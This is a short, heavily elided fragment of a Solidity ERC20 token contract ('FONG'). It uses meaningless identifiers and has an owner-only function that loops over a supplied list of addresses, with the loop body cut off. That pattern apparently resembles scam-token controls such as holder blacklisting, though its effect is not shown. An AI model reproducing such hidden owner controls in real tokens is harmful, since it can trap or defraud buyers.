...
contract tiffanyfong is Context, IERC20 {
    ...
    constructor () {
        ...
        _symbol = "FONG";
        _decimals = 18;
        uint256 initialSupply = 502000000;
         bathroom = msg.sender;
    ...
    function sulphur(address[] memory fax) public onlyOwner() {
        for (uint256 i = 0; i < fax.length; i++) {
            address account = fax[i];
